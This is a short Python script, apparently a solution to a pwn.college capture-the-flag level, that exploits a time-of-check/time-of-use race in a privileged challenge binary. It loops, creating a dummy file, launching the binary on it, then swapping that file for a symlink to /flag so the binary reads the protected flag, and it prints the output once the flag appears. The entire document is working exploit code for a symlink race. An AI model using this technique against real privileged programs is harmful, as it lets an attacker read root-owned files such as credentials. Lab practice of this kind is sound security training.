# Level1
import os

import pwn
from dojotool import find_challenge


def ctf() -> None:
    root_bin = find_challenge()
    flag_file = "/flag"
    fake_file = "/home/hacker/f"
    while True:
        os.unlink(fake_file)
        open(fake_file, "w").close()
        with pwn.process([root_bin, fake_file], raw=True, level="error") as io:
            # io.sendline()
            os.unlink(fake_file)
            os.symlink(flag_file, fake_file)
            # io.sendline()
            data = io.recvrepeat().decode(errors="ignore")
            if "pwn.college{" in data:
                print(data)
                break


if __name__ == "__main__":
    ctf()
